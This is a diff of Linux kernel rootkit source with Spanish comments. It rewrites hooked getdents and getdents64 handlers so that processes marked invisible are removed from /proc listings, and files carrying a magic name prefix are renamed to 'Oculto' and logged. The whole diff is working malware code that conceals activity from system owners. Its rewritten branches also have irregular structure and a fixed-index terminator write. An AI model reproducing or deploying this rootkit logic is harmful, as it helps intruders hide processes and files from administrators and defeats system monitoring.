@@ -157,43 +157,25 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 	// CAMBIO: Ocultar procesos invisibles del listado de /proc o de otros listados
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-
-		// Verifica si estamos leyendo /proc (por tipo de sistema de archivos)
-		if (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))) {
-			/*
-			* Si el proceso es "invisible" (está en la lista de ocultos),
-			* en lugar de eliminarlo de la lista de entradas (lo cual podría
-			* causar errores si otras funciones intentan acceder al buffer),
-			* simplemente sobrescribimos su nombre con "oculto".
-			*
-			* Esto mantiene la entrada en el listado de /proc, pero disfraza su identidad.
-			* strncpy asegura que no escribamos fuera de los límites del campo d_name.
-			*/
+		if (!proc && 
+		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)){
 			printk(KERN_INFO "Interceptado archivo: %s\n", dir->d_name);
-			strncpy(dir->d_name, "oculto", sizeof(dir->d_name));
+			strncpy(dir->d_name, "Oculto", 7);
+			dir->d_name[7] = '\0'; // Null-termina
 		}
-
-		// Oculta archivos que comienzan con el prefijo mágico (ej. módulos ocultos)
-		else if (!proc && memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0) {
-			/*
-			* Si el archivo tiene el prefijo mágico, se elimina del buffer
-			* reacomodando las entradas restantes.
-			*/
-			if (dir == kdirent) {
-				// Si es la primera entrada, ajustamos el buffer directamente
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			// Si no es la primera, extendemos el tamaño de la entrada anterior para saltarla
-			prev->d_reclen += dir->d_reclen;
-		} else {
-			// Guardamos la entrada previa por si necesitamos combinar reclens
+			else if (proc &&
+			is_invisible(simple_strtoul(dir->d_name, NULL, 10))) {
+				if (dir == kdirent) {
+					ret -= dir->d_reclen;
+					memmove(dir, (void *)dir + dir->d_reclen, ret);
+					continue;
+				}
+				prev->d_reclen += dir->d_reclen;
+			} 
+		else
 			prev = dir;
-		}
-
-		// Avanzamos al siguiente registro
 		off += dir->d_reclen;
+
 	}
 	err = copy_to_user(dirent, kdirent, ret);
 	if (err)
@@ -248,42 +230,25 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	// CAMBIO: Ocultar procesos invisibles del listado de /proc o de otros listados
 	while (off < ret) {
 		dir = (void *)kdirent + off;
-
-		// Verifica si estamos leyendo /proc (por tipo de sistema de archivos)
-		if (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))) {
-			/*
-			* Si el proceso es "invisible" (está en la lista de ocultos),
-			* en lugar de eliminarlo de la lista de entradas (lo cual podría
-			* causar errores si otras funciones intentan acceder al buffer),
-			* simplemente sobrescribimos su nombre con "oculto".
-			*
-			* Esto mantiene la entrada en el listado de /proc, pero disfraza su identidad.
-			* strncpy asegura que no escribamos fuera de los límites del campo d_name.
-			*/
-			strncpy(dir->d_name, "oculto", sizeof(dir->d_name));
+		if (!proc && 
+		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)){
+			printk(KERN_INFO "Interceptado archivo: %s\n", dir->d_name);
+			strncpy(dir->d_name, "Oculto", 7);
+			dir->d_name[7] = '\0'; // Null-termina
 		}
-
-		// Oculta archivos que comienzan con el prefijo mágico (ej. módulos ocultos)
-		else if (!proc && memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0) {
-			/*
-			* Si el archivo tiene el prefijo mágico, se elimina del buffer
-			* reacomodando las entradas restantes.
-			*/
-			if (dir == kdirent) {
-				// Si es la primera entrada, ajustamos el buffer directamente
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			// Si no es la primera, extendemos el tamaño de la entrada anterior para saltarla
-			prev->d_reclen += dir->d_reclen;
-		} else {
-			// Guardamos la entrada previa por si necesitamos combinar reclens
+			else if (proc &&
+			is_invisible(simple_strtoul(dir->d_name, NULL, 10))) {
+				if (dir == kdirent) {
+					ret -= dir->d_reclen;
+					memmove(dir, (void *)dir + dir->d_reclen, ret);
+					continue;
+				}
+				prev->d_reclen += dir->d_reclen;
+			} 
+		else
 			prev = dir;
-		}
-
-		// Avanzamos al siguiente registro
 		off += dir->d_reclen;
+
 	}
 	err = copy_to_user(dirent, kdirent, ret);
 	if (err)
